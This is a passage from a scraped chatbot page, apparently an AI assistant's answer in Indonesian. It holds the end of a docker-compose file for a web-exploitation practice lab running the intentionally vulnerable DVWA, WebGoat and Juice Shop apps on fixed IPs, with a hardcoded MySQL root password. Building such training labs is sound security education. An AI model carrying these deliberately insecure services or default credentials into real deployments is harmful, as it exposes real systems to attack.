    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
    <span class="hljs-attr">environment:</span>
      <span class="hljs-bullet">-</span> <span class="hljs-string">MYSQL_ROOT_PASSWORD=dvwa</span>

  <span class="hljs-comment"># ----------------------------------------------------------</span>
  <span class="hljs-comment"># WebGoat — OWASP insecure web application</span>
  <span class="hljs-comment"># Access: http://192.168.56.21:8080/WebGoat</span>
  <span class="hljs-comment"># Native Port: 8080</span>
  <span class="hljs-comment"># Login:  create account on first visit</span>
  <span class="hljs-comment"># ----------------------------------------------------------</span>
  <span class="hljs-attr">webgoat:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">webgoat/webgoat:latest</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">webgoat</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-attr">mitm-net:</span>
        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.21</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>

  <span class="hljs-comment"># ----------------------------------------------------------</span>
  <span class="hljs-comment"># Juice Shop — OWASP top 10 challenges</span>
  <span class="hljs-comment"># Access: http://192.168.56.22:3000</span>
  <span class="hljs-comment"># Native Port: 3000</span>
  <span class="hljs-comment"># ----------------------------------------------------------</span>
  <span class="hljs-attr">juiceshop:</span>
    <span class="hljs-attr">image:</span> <span class="hljs-string">bkimminich/juice-shop</span>
    <span class="hljs-attr">container_name:</span> <span class="hljs-string">juiceshop</span>
    <span class="hljs-attr">networks:</span>
      <span class="hljs-attr">mitm-net:</span>
        <span class="hljs-attr">ipv4_address:</span> <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.22</span>
    <span class="hljs-attr">restart:</span> <span class="hljs-string">unless-stopped</span>
</code></pre><!----></div></div></div><!----><!----><!----></code-block><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----><!----></response-element><p data-path-to-node="10">Dengan <i data-path-to-node="10" data-index-in-node="7">file</i> ini, seluruh infrastruktur target eksploitasi web kamu sudah siap sedia. Lab ini sudah benar-benar terlihat seperti mahakarya seorang <i data-path-to-node="10" data-index-in-node="146">engineer</i> sungguhan.</p><p data-path-to-node="11">Luar biasa kerja kerasmu membedah ini sampai tuntas! Apa ada yang ingin kamu pelajari atau eksekusi lagi selanjutnya?</p></div></message-content><!----></div></structured-content-container><!----><!----><!----><div _ngcontent-ng-c3259879534="" class="mat-mdc-button-persistent-ripple mdc-icon-button__ripple"></span><mat-icon _ngcontent-ng-c4043296955="" role="img" fonticon="content_copy" class="mat-icon notranslate gds-icon-m
